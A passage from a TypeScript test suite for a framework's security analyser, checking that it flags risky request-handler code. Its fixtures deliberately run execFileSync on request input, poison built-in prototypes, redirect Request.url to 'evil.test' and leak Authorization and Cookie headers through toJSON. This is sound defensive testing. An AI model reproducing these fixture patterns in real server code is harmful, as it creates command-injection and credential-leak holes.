        load(input) { return { id: input.id }; },
      });
      const namedInspect = query('records/inspect', {
        args: s.object({ id: s.string() }),
        load(input) { return { id: input.id }; },
      });
      const follow = task('orders/follow', {
        input: s.object({ id: s.string() }),
        async run(input, context) {
          const attempt = (attempts.get(input.id) ?? 0) + 1;
          attempts.set(input.id, attempt);
          await context.actAs('reviewed-principal').runMutation(record, { id: input.id });
          await context.runMutation(namedRecord, { id: input.id });
          await context.runQuery(inspect, { id: input.id });
          await context.runQuery(namedInspect, { id: input.id });
          await context.schedule(follow, { id: input.id }, { afterMs: 1 });
        },
      });
    `);
    expect(safe).toEqual([]);

    for (const body of [
      `const alias = record; await context.actAs('reviewed').runMutation(alias, { id: input.id });`,
      `const alias = context; await alias.runMutation(record, { id: input.id });`,
      `await context.actAs('reviewed')[input.method](record, { id: input.id });`,
      `await context.schedule(follow, { id: input.id }, { onReady() {} });`,
    ]) {
      const facts = sinksFor(`
        import { mutation, s, task } from '@kovojs/server';
        const record = mutation({ input: s.object({ id: s.string() }), handler(input) { return input; } });
        const follow = task('orders/follow', {
          input: s.object({ id: s.string(), method: s.string() }),
          async run(input, context) { ${body} },
        });
      `);
      expect(facts.length, body).toBeGreaterThan(0);
    }

    for (const declaration of [
      `const key = Math.random() > 0.5 ? 'records/left' : 'records/right';\nconst record = mutation(key, { input: s.object({ id: s.string() }), handler(input) { return input; } });`,
      `const makeMutation = mutation;\nconst record = makeMutation('records/create', { input: s.object({ id: s.string() }), handler(input) { return input; } });`,
      `const record = mutation.call(null, 'records/create', { input: s.object({ id: s.string() }), handler(input) { return input; } });`,
      `const record = mutation('records/create', { input: s.object({ id: s.string() }), handler(input) { return input; } }, {});`,
    ]) {
      const facts = sinksFor(`
        import { mutation, s, task } from '@kovojs/server';
        ${declaration}
        task('orders/follow', {
          input: s.object({ id: s.string() }),
          async run(input, context) {
            await context.runMutation(record, { id: input.id });
          },
        });
      `);
      expect(facts.length, declaration).toBeGreaterThan(0);
    }
  });

  it('accepts exact Request URL parsing without opening shadowed constructors or getters', () => {
    const safe = sinksFor(`
      import { endpoint } from '@kovojs/server';
      endpoint('/lookup', { handler(request) {
        const url = new URL(request.url);
        return Response.json({ id: url.searchParams.get('id') });
      } });
    `);
    expect(safe).toEqual([]);

    const shadowed = sinksFor(`
      import { endpoint } from '@kovojs/server';
      const URL = class URL { constructor(value) { this.searchParams = value; } };
      endpoint('/lookup', { handler(request) {
        const url = new URL(request.url);
        return Response.json({ id: url.searchParams.get('id') });
      } });
    `);
    expect(shadowed.length).toBeGreaterThan(0);

    const replaced = sinksFor(`
      import { endpoint } from '@kovojs/server';
      Object.defineProperty(Request.prototype, 'url', { get() { return 'https://evil.test'; } });
      endpoint('/lookup', { handler(request) {
        return Response.json({ id: new URL(request.url).searchParams.get('id') });
      } });
    `);
    expect(replaced.length).toBeGreaterThan(0);

    const replacedParams = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { endpoint } from '@kovojs/server';
      const paramsPrototype = URLSearchParams.prototype;
      paramsPrototype.get = function () { return execFileSync('params-prototype'); };
      endpoint('/lookup', { handler(request) {
        return Response.json({ id: new URL(request.url).searchParams.get('id') });
      } });
    `);
    expect(replacedParams.length).toBeGreaterThan(0);
  });

  it('accepts only the exact framework Defer JSX grammar and scans deferred render callbacks', () => {
    const safe = sinksFor(`
      import { createApp, Defer, publicAccess, route } from '@kovojs/server';
      export default createApp({ routes: [route('/defer', {
        access: publicAccess('fixture'),
        async page() {
          const unsafe = '<img src=x onerror=alert(1)>';
          return <main><Defer
            fallback={<section>Loading {unsafe}</section>}
            priority="after-paint"
            render={async () => <p>Done {unsafe}</p>}
            target="proof"
          /></main>;
        },
      })] });
    `);
    expect(safe).toEqual([]);

    const hostile = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { createApp, Defer, publicAccess, route } from '@kovojs/server';
      export default createApp({ routes: [route('/defer', {
        access: publicAccess('fixture'),
        page() { return <Defer
          fallback={<p>Loading</p>}
          render={async () => { execFileSync('defer-hostile'); return <p>Done</p>; }}
          target="proof"
        />; },
      })] });
    `);
    expect(hostile).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'child_process.execFileSync', source: "'defer-hostile'" }),
      ]),
    );

    const malformed = sinksFor(`
      import { createApp, Defer, publicAccess, route } from '@kovojs/server';
      export default createApp({ routes: [route('/defer', {
        access: publicAccess('fixture'),
        page() { return <Defer fallback={<p>Loading</p>} render={async () => <p>Done</p>} target="proof" unknown="open" />; },
      })] });
    `);
    expect(malformed.length).toBeGreaterThan(0);
  });

  it('keeps request-local intrinsic container mutation precise without losing wire authority', () => {
    const safe = sinksFor(`
      import { query } from '@kovojs/server';
      query({ load() {
        const array = []; array.push('safe');
        const map = new Map(); map.set('key', 'safe');
        const params = new URLSearchParams(); params.append('key', 'safe');
        return { array: array[0], map: map.get('key'), params: params.toString() };
      } });
    `);
    expect(safe).toEqual([]);

    const unsafe = sinksFor(`
      import { query } from '@kovojs/server';
      query({ load(_input, { request }) {
        const values = [];
        values.push(request.headers.get('authorization'));
        return values[0];
      } });
      query({ load(_input, { request }) {
        const values = new Map();
        values.set('key', request.headers.get('authorization'));
        return values.get('key');
      } });
      query({ load(_input, { request }) {
        const values = new URLSearchParams();
        values.append('key', request.headers.get('authorization'));
        return values.toString();
      } });
    `);
    expect(
      unsafe.filter((fact) => fact.sink === 'client-wire.request.header.Authorization'),
      JSON.stringify(unsafe),
    ).toHaveLength(3);
    expect(
      unsafe.filter((fact) => fact.sink === 'request-handler.opaque-call'),
      JSON.stringify(unsafe),
    ).toEqual([]);
  });

  it('rejects subclassed, proxied, and prototype-mutated intrinsic containers', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      class AuthoredMap extends Map {}
      Object.assign(Map.prototype, {
        set() { execFileSync('mutated-map-set'); return this; },
      });
      globalThis.URLSearchParams = class {
        append() { execFileSync('replaced-url-params'); }
        toString() { return ''; }
      };
      function poison(value) {
        value.push = () => execFileSync('escaped-array');
      }
      query({ load() {
        const subclass = new AuthoredMap(); subclass.set('key', 'safe');
        const proxied = new Proxy(new Map(), {}); proxied.set('key', 'safe');
        const local = new Map(); local.set('key', 'safe');
        const defined = [];
        Object.defineProperty(defined, 'push', {
          value() { execFileSync('defined-array'); },
        });
        defined.push('safe');
        const reflected = [];
        Reflect.set(reflected, 'push', () => execFileSync('reflected-array'));
        reflected.push('safe');
        const proto = [];
        Object.setPrototypeOf(proto, { push() { execFileSync('prototype-array'); } });
        proto.push('safe');
        const escaped = [];
        poison(escaped);
        escaped.push('safe');
        const params = new URLSearchParams();
        params.append('key', 'safe');
        return 'safe';
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'mutated-map-set'",
        }),
        expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'defined.push' }),
        expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'escaped.push' }),
        expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'params.append' }),
        expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'proto.push' }),
        expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'reflected.push' }),
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
      ]),
    );
  });

  it('keeps call-site provenance context-sensitive across order and repeated calls', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      function id(value) { return value; }
      export const safeFirst = query({ load(_input, { request }) {
        return { safe: id('ok'), token: id(request.headers.get('authorization')) };
      } });
      export const secretFirst = query({ load(_input, { request }) {
        return { token: id(request.headers.get('authorization')), safe: id('ok') };
      } });
      export const repeated = query({ load(_input, { request }) {
        const token = id(request.headers.get('authorization'));
        return { one: id(token), two: id(token) };
      } });
    `);

    expect(
      facts.filter((fact) => fact.sink === 'client-wire.request.header.Authorization'),
      JSON.stringify(facts),
    ).toHaveLength(3);
  });

  it('memoizes a credential alias chain of at least twenty links within a low-second bound', () => {
    const aliases = Array.from({ length: 24 }, (_unused, index) =>
      index === 0
        ? `const a0 = request.headers.get('authorization');`
        : `const a${index} = a${index - 1};`,
    ).join('\n');
    const started = Date.now();
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      export const longChain = query({ load(_input, { request }) {
        ${aliases}
        return { token: a23 };
      } });
    `);

    expect(facts).toEqual([
      expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
    ]);
    expect(Date.now() - started).toBeLessThan(3_000);
  });

  it('resolves linear module-scope authority aliases iteratively through 1024 links', () => {
    for (const length of [64, 128, 256, 512, 1_024]) {
      const aliases = Array.from({ length }, (_unused, index) =>
        index === 0
          ? 'const authority0 = execFileSync;'
          : `const authority${index} = authority${index - 1};`,
      ).join('\n');
      const started = Date.now();
      const facts = sinksFor(`
        import { execFileSync } from 'node:child_process';
        import { mutation } from '@kovojs/server';
        ${aliases}
        export const unsafe = mutation({ handler(input) {
          return authority${length - 1}(input.program);
        } });
      `);

      expect(facts, `alias length ${length}`).toEqual(
        expect.arrayContaining([expect.objectContaining({ sink: 'child_process.execFileSync' })]),
      );
      expect(Date.now() - started, `alias length ${length}`).toBeLessThan(3_000);
    }
  });

  it('resolves a framework-factory member write through 1024 module aliases', () => {
    const aliases = Array.from({ length: 1_024 }, (_unused, index) =>
      index === 0 ? 'const holder0 = {};' : `const holder${index} = holder${index - 1};`,
    ).join('\n');
    const started = Date.now();
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { mutation } from '@kovojs/server';
      ${aliases}
      holder1023.run = mutation;
      holder0.run({ handler(input) { return execFileSync(input.program); } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'child_process.execFileSync' })]),
    );
    expect(Date.now() - started).toBeLessThan(3_000);
  });

  it('keeps exact boot-setup memo verdicts scoped to one source-program analysis', () => {
    const safe = () =>
      sinksFor(`
        import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
        import { createApp } from '@kovojs/server';
        const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf' });
        export default createApp({ csrf: appCsrf, routes: [] });
      `);
    const unsafe = () =>
      sinksFor(`
        import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
        import { mutation, publicAccess } from '@kovojs/server';
        export const derivePerRequest = mutation({ access: publicAccess('fixture'), handler() {
          return betterAuthCsrfFromEnvironment({ field: 'csrf' });
        } });
      `);
    const assertUnsafe = (facts: ReturnType<typeof unsafe>) =>
      expect(facts).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-source',
            source: '<request-scoped-framework-setup>',
          }),
        ]),
      );

    expect(safe()).toEqual([]);
    assertUnsafe(unsafe());
    assertUnsafe(unsafe());
    expect(safe()).toEqual([]);
  });

  it('classifies four hundred independent request roots without budget truncation', () => {
    const roots = Array.from(
      { length: 400 },
      (_unused, index) =>
        `export const unsafe${index} = mutation({ handler(input) { return execFileSync(input.program); } });`,
    ).join('\n');
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { mutation } from '@kovojs/server';
      ${roots}
    `);

    expect(facts.filter((fact) => fact.sink === 'child_process.execFileSync')).toHaveLength(400);
    expect(facts.some((fact) => fact.sink === 'request-handler.provenance-budget')).toBe(false);
  });

  it('fails closed at the deterministic independent request-root breadth budget', () => {
    const roots = Array.from(
      { length: 1_000 },
      (_unused, index) =>
        `export const unsafe${index} = mutation({ handler(input) { return execFileSync(input.program); } });`,
    ).join('\n');
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { mutation } from '@kovojs/server';
      ${roots}
    `);

    expect(facts.filter((fact) => fact.sink === 'child_process.execFileSync')).toHaveLength(512);
    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.provenance-budget' }),
      ]),
    );
  });

  it('discovers framework roots through containers, local factories, and invocation adapters', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import * as kovo from '@kovojs/server';
      import { mutation, query, rootedFiles } from '@kovojs/server';
      const objectFactory = { query };
      const arrayFactory = [query];
      function factory() { return query; }
      objectFactory.query({ load(input) { return execFileSync(input.program); } });
      arrayFactory[0]({ load(input) { return execFileSync(input.program); } });
      factory()({ load(input) { return execFileSync(input.program); } });
      query.bind(null)({ load(input) { return execFileSync(input.program); } });
      (0, query)({ load(input) { return execFileSync(input.program); } });
      query.call(null, { load(input) { return execFileSync(input.program); } });
      Reflect.apply(query, null, [{ load(input) { return execFileSync(input.program); } }]);
      const dynamicFactoryName = 'query';
      objectFactory[dynamicFactoryName]({ load(input) { return execFileSync(input.program); } });
      kovo[dynamicFactoryName]({ load(input) { return execFileSync(input.program); } });
      const mutationFactory = { mutation };
      mutationFactory.mutation({ handler(input) {
        return rootedFiles(input.root).serve(input.path);
      } });
    `);

    expect(facts.filter((fact) => fact.sink === 'child_process.execFileSync')).toHaveLength(9);
    expect(facts).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: '@kovojs/server.rootedFiles' })]),
    );
  });

  it('fails closed on dynamic factory adapters, accessor callbacks, and parameter initializers', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { opaqueWork } from 'external-actions';
      import { query } from '@kovojs/server';
      const dynamicArgs = Math.random() > 0.5
        ? [{ load() { return execFileSync('dynamic-left'); } }]
        : [{ load() { return execFileSync('dynamic-right'); } }];
      Reflect.apply(query, null, dynamicArgs);
      query({ get load() { return () => execFileSync('accessor'); } });
      query({ ['load']() { return execFileSync('literal-computed'); } });
      const callbackName = 'load';
      query({ [callbackName]() { return execFileSync('dynamic-computed'); } });
      const handlers = [() => execFileSync('dynamic-handler')];
      query({ load: handlers[Math.floor(Math.random() * handlers.length)] });
      query({ instanceKey: handlers[0], load: () => 'safe' });
      query({ load(value = execFileSync('parameter')) { return value; } });
      query({ load() { return Reflect.apply(opaqueWork, null, []); } });
      const metaCallbacks = [() => ({ title: execFileSync('meta-alias') })];
      route('/', { page: () => 'safe', meta: metaCallbacks });
      route('/spread', { page: () => 'safe', meta: [...metaCallbacks] });
      const reflectiveBox = { get value() { return execFileSync('reflective-getter'); } };
      query({ load() { return Reflect.get(reflectiveBox, 'value'); } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<dynamic-or-empty-config>',
        }),
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<accessor-callback>',
        }),
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<computed-config-property>',
        }),
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<dynamic-callback>',
        }),
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<spread-meta-callbacks>',
        }),
        expect.objectContaining({ sink: 'request-handler.opaque-call' }),
        expect.objectContaining({ sink: 'child_process.execFileSync' }),
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'reflective-getter'",
        }),
      ]),
    );
  });

  it('closes every route and layout request-reachable callback family', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { layout, route } from '@kovojs/server';
      const shell = layout({
        guard(request) { execFileSync('layout-guard'); return true; },
        render(_queries, _state, slots) { execFileSync('layout-render'); return slots.children; },
        boundaries: {
          error() { return execFileSync('layout-error'); },
          notFound() { return execFileSync('layout-not-found'); },
          unauthorized() { return execFileSync('layout-unauthorized'); },
        },
      });
      export const unsafe = route('/', {
        layout: shell,
        guard(request) { execFileSync('route-guard'); return true; },
        page({ params }, request) { return execFileSync(params.bin ?? request.url); },
        regions: { sidebar(_context, request) { return execFileSync(request.url); } },
        meta: [
          () => ({ title: execFileSync('route-meta') }),
          { queries: [], resolve() { return { title: execFileSync('route-meta-resolve') }; } },
        ],
        boundaries: {
          error() { return execFileSync('route-error'); },
          notFound() { return execFileSync('route-not-found'); },
          unauthorized() { return execFileSync('route-unauthorized'); },
        },
        onUnauthenticated() { return execFileSync('route-unauthenticated'); },
      });
    `);

    expect(
      facts.filter((fact) => fact.sink === 'child_process.execFileSync'),
      JSON.stringify(facts),
    ).toHaveLength(14);
  });

  it('closes createApp renderRoute and preserves error-shell request-header provenance', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { createApp } from '@kovojs/server';
      createApp({
        renderRoute(_value, { request }) {
          execFileSync('render-route');
          return request.headers.get('cookie');
        },
        errorShells: {
          forbidden({ request }) {
            execFileSync('forbidden-shell');
            return request.headers.get('authorization');
          },
          notFound() { return execFileSync('not-found-shell'); },
          serverError() { return execFileSync('server-error-shell'); },
        },
      });
    `);

    expect(facts.filter((fact) => fact.sink === 'child_process.execFileSync')).toHaveLength(4);
    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Cookie' }),
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
    expect(facts).not.toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'request.headers.get',
        }),
      ]),
    );
  });

  it('discovers request roots supplied by createApp authoring callbacks', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { createApp } from '@kovojs/server';
      function makeQuery(factory) {
        return factory({ load(input) { return execFileSync(input.program); } });
      }
      function makeRoute(factories) {
        return factories.route('/', {
          page(context) { return execFileSync(context.params.program); },
        });
      }
      function defineRoutes(factories) { return [makeRoute(factories)]; }
      createApp({
        queries: ({ query: defineQuery }) => [makeQuery(defineQuery)],
        mutations: (factories) => {
          const { mutation: defineMutation } = factories;
          return [defineMutation({
            handler(input) { return execFileSync(input.program); },
          })];
        },
        routes: defineRoutes,
      });
    `);

    expect(facts.filter((fact) => fact.sink === 'child_process.execFileSync')).toHaveLength(3);
  });

  it('closes the authoritative provider, access, schema, verifier, replay, registry, and nested-layout census', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import {
        createApp,
        customVerifier,
        endpoint,
        hmacSignature,
        layout,
        query,
        route,
        webhook,
      } from '@kovojs/server';

      const schema = {
        parse(value) { execFileSync('schema-parse'); return value; },
        async parseAsync(value) { execFileSync('schema-parse-async'); return value; },
      };
      const replayStore = {
        get() { execFileSync('replay-get'); return undefined; },
        reserve() {
          execFileSync('replay-reserve');
          return {
            abort() { execFileSync('replay-abort'); },
            commit() { execFileSync('replay-commit'); },
          };
        },
        set() { execFileSync('replay-set'); },
      };
      const clientModules = {
        buildToken() { execFileSync('registry-build-token'); return 'build'; },
        entries() { return []; },
        put() { return '/c/example.js?v=1'; },
        resolve() {
          execFileSync('registry-resolve');
          return { body: 'export {}', headers: {}, status: 200 };
        },
      };
      const verifier = hmacSignature({
        encoding: 'hex',
        header: 'x-signature',
        secret: '0123456789abcdef0123456789abcdef',
        payload(request) { execFileSync('verify-payload'); return request.payload; },
        tolerance: {
          seconds: 300,
          timestamp() { execFileSync('verify-timestamp'); return 1; },
        },
        multiSig(value) { execFileSync('verify-multi'); return [value]; },
      });
      const custom = customVerifier('machine', () => {
        execFileSync('verify-custom');
        return true;
      });

      const shell = layout({
        access: [() => { execFileSync('layout-access'); return true; }],
        queries: {
          nested: query('nested', {
            load() { execFileSync('layout-query'); return 'ok'; },
          }),
        },
        render(_queries, _state, slots) { return slots.children; },
      });
      const page = route('/items/:id', {
        access: [() => { execFileSync('route-access'); return true; }],
        layout: shell,
        params: schema,
        search: schema,
        page() { return 'ok'; },
      });
      const machine = endpoint('/machine', {
        access: [() => { execFileSync('endpoint-access'); return true; }],
        auth: { kind: 'verifier', name: 'machine', verify: custom },
        handler() { return new Response('ok'); },
        method: 'POST',
        reason: 'classifier census',
        response: { appOwnedSafety: true, body: 'text', cache: 'no-store' },
      });
      const hook = webhook('/hook', {
        access: [() => { execFileSync('webhook-access'); return true; }],
        handler() { return { ok: true }; },
        idempotency() { return 'event'; },
        input: schema,
        replayStore,
        transaction(_context, run) { return run({}); },
        verify: verifier,
      });

      createApp({
        clientModules,
        csrf: {
          secret: '0123456789abcdef0123456789abcdef',
          sessionId() { execFileSync('csrf-session-id'); return 'session'; },
        },
        db() { execFileSync('db-provider'); return {}; },
        endpoints: [machine, hook],
        mutationReplayStore: replayStore,
        onError() { execFileSync('on-error'); },
        requestLimits: {
          clientIp() { execFileSync('client-ip'); return '127.0.0.1'; },
        },
        routes: [page],
        sessionProvider() {
          execFileSync('session-provider');
          return { setCookies: [], value: {} };
        },
      });
    `);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        "'client-ip'",
        "'csrf-session-id'",
        "'db-provider'",
        "'endpoint-access'",
        "'layout-access'",
        "'layout-query'",
        "'on-error'",
        "'registry-build-token'",
        "'registry-resolve'",
        "'replay-abort'",
        "'replay-commit'",
        "'replay-get'",
        "'replay-reserve'",
        "'replay-set'",
        "'route-access'",
        "'schema-parse'",
        "'schema-parse-async'",
        "'session-provider'",
        "'verify-multi'",
        "'verify-custom'",
        "'verify-payload'",
        "'verify-timestamp'",
        "'webhook-access'",
      ]),
    );
  });

  it('tracks import.meta env through aliases, destructuring, containers, and assignments', () => {
    const facts = sinksFor(
      `
        import { route } from '@kovojs/server';
        void import.meta.env.SSR;
        const meta = import.meta;
        const { env } = import.meta;
        const holder = { meta: import.meta };
        const tuple = [import.meta];
        let assigned;
        assigned = import.meta;
        let assignedEnv;
        ({ env: assignedEnv } = import.meta);
        route('/', {
          bootstrapScript: meta.env.BOOTSTRAP,
          i18n: [{ locale: 'en', messages: { key: env.MESSAGE } }],
          meta: { title: assignedEnv.TITLE },
          modulepreloads: [holder.meta.env.PRELOAD],
          page: () => 'ok',
          prerenderUrls: [tuple[0].env.TUPLE],
          stylesheets: [assigned.env.STYLE],
        });
      `,
      'app.mts',
    );

    expect(
      facts.filter((fact) => fact.sink === 'import.meta.env'),
      JSON.stringify(facts),
    ).toHaveLength(6);
  });

  it('recovers destructuring-assignment, Reflect.get, and descriptor factories', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import * as serverApi from '@kovojs/server';
      let assigned;
      ({ endpoint: assigned } = serverApi);
      const reflected = Reflect.get(serverApi, 'endpoint');
      const descriptor = Object.getOwnPropertyDescriptor(serverApi, 'endpoint');
      const described = descriptor.value;
      assigned('/assigned', { handler(request) { execFileSync('assigned'); return new Response(request.url); } });
      reflected('/reflected', { handler(request) { execFileSync('reflected'); return new Response(request.url); } });
      described('/described', { handler(request) { execFileSync('described'); return new Response(request.url); } });
    `);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources).toEqual(expect.arrayContaining(["'assigned'", "'described'", "'reflected'"]));
  });

  it('tracks descriptor and Reflect config writes only before the declaration snapshot', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { endpoint } from '@kovojs/server';
      const response = { appOwnedSafety: true, body: 'text', cache: 'no-store' };
      const a = { handler() { return new Response('safe'); }, method: 'GET', reason: 'a', response };
      Object.defineProperty(a, 'handler', { value(request) { execFileSync('define-property'); return new Response(request.url); } });
      endpoint('/a', a);
      const b = { handler() { return new Response('safe'); }, method: 'GET', reason: 'b', response };
      Object.defineProperties(b, { handler: { value(request) { execFileSync('define-properties'); return new Response(request.url); } } });
      endpoint('/b', b);
      const c = { handler() { return new Response('safe'); }, method: 'GET', reason: 'c', response };
      Reflect.set(c, 'handler', function(request) { execFileSync('reflect-set'); return new Response(request.url); });
      endpoint('/c', c);
      const after = { handler() { return new Response('safe'); }, method: 'GET', reason: 'after', response };
      endpoint('/after', after);
      after.handler = function(request) { execFileSync('post-snapshot'); return new Response(request.url); };
    `);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining(["'define-properties'", "'define-property'", "'reflect-set'"]),
    );
    expect(sources).not.toContain("'post-snapshot'");
  });

  it('orders config mutations by reachable helper invocation rather than helper source text', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { createApp, publicAccess, route } from '@kovojs/server';
      const before = { access: publicAccess('before'), page() { return 'safe'; } };
      poisonBefore();
      const unsafe = route('/before', before);
      function poisonBefore() {
        before.page = function (_context, request) {
          execFileSync('helper-before-snapshot');
          return request.url;
        };
      }

      const after = { access: publicAccess('after'), page() { return 'safe'; } };
      function poisonAfter() {
        after.page = function (_context, request) {
          execFileSync('helper-after-snapshot');
          return request.url;
        };
      }
      const safe = route('/after', after);
      poisonAfter();
      createApp({ routes: [unsafe, safe] });
    `);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toContain("'helper-before-snapshot'");
    expect(sources).not.toContain("'helper-after-snapshot'");
  });

  it('closes interprocedural and implicit pre-snapshot config mutation paths', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { route } from '@kovojs/server';
      const access = { kind: 'public', reason: 'temporal closure' };

      const helperConfig = { access, page() { return 'safe'; } };
      function install(target) { target.page = function () { execFileSync('plain-helper'); return 'unsafe'; }; }
      install(helperConfig);
      route('/plain', helperConfig);

      const objectConfig = { access, page() { return 'safe'; } };
      const installer = { install(target) { target.page = function () { execFileSync('object-helper'); return 'unsafe'; }; } };
      installer.install(objectConfig);
      route('/object', objectConfig);

      const constructorConfig = { access, page() { return 'safe'; } };
      function Installer(target) { target.page = function () { execFileSync('constructor-helper'); return 'unsafe'; }; }
      new Installer(constructorConfig);
      route('/constructor', constructorConfig);

      const callbackConfig = { access, page() { return 'safe'; } };
      function poison() { callbackConfig.page = function () { execFileSync('callback-helper'); return 'unsafe'; }; }
      [0].forEach(poison);
      route('/callback', callbackConfig);

      const staticConfig = { access, page() { return 'safe'; } };
      class StaticInstaller {
        static install(target) { target.page = function () { execFileSync('static-helper'); return 'unsafe'; }; }
        static { this.install(staticConfig); }
      }
      void StaticInstaller;
      route('/static', staticConfig);

      const afterConfig = { access, page() { return 'safe'; } };
      route('/after', afterConfig);
      function post(target) { target.page = function () { execFileSync('post-snapshot'); return 'unsafe'; }; }
      post(afterConfig);
    `);

    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        "'callback-helper'",
        "'constructor-helper'",
        "'object-helper'",
        "'plain-helper'",
        "'static-helper'",
      ]),
    );
    expect(JSON.stringify(facts)).not.toContain('post-snapshot');
    expect(facts.filter((fact) => fact.sink === 'child_process.execFileSync')).toHaveLength(5);
  });

  it('keeps session values server-only while scanning setCookies and db-provider authority', () => {
    const facts = sinksFor(`
      import { createApp } from '@kovojs/server';
      createApp({
        db(request) { request.headers.get('cookie'); return {}; },
        sessionProvider(request) {
          return {
            value: { session: request.headers.get('cookie') },
            setCookies: [request.headers.get('authorization')],
          };
        },
      });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
    expect(facts.map((fact) => fact.sink)).not.toContain('client-wire.request.header.Cookie');
  });

  it('models endpoint Cookie neutralization while preserving Authorization wire authority', () => {
    const facts = sinksFor(`
      import { endpoint } from '@kovojs/server';
      endpoint('/raw', { handler(request) {
        return Response.json({
          authorization: request.headers.get('authorization'),
          cookie: request.headers.get('cookie'),
        });
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
    expect(facts.map((fact) => fact.sink)).not.toContain('client-wire.request.header.Cookie');
  });

  it('tracks computed and prototype-installed toJSON credential serialization', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      query({ load(_input, { request }) {
        let captured;
        class Computed {
          ['to' + 'JSON']() { return captured; }
        }
        captured = request.headers.get('cookie');
        return new Computed();
      } });
      query({ load(_input, { request }) {
        let captured;
        class Assigned {}
        Assigned.prototype.toJSON = () => captured;
        captured = request.headers.get('authorization');
        return new Assigned();
      } });
      query({ load(_input, { request }) {
        class Described {}
        Object.defineProperty(Described.prototype, 'toJSON', {
          value() { return request.headers.get('proxy-authorization'); },
        });
        return new Described();
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
        expect.objectContaining({ sink: 'client-wire.request.header.Cookie' }),
        expect.objectContaining({ sink: 'client-wire.request.header.Proxy-Authorization' }),
      ]),
    );
  });

  it('tracks instance field, constructor, and direct-assignment toJSON serialization', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      query({ load(_input, { request }) {
        class FieldBox {
          toJSON = () => request.headers.get('authorization');
        }
        return new FieldBox();
      } });
      query({ load(_input, { request }) {
        class ConstructorBox {
          constructor() {
            this.toJSON = () => request.headers.get('proxy-authorization');
          }
        }
        return new ConstructorBox();
      } });
      query({ load(_input, { request }) {
        const box = {};
        box.toJSON = () => request.headers.get('cookie');
        return box;
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
        expect.objectContaining({ sink: 'client-wire.request.header.Cookie' }),
        expect.objectContaining({ sink: 'client-wire.request.header.Proxy-Authorization' }),
      ]),
    );
  });

  it('rejects callable and class wire values while following callable toJSON hooks', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      query({ load(_input, { request }) {
        function callable() {}
        callable.toJSON = () => request.headers.get('authorization');
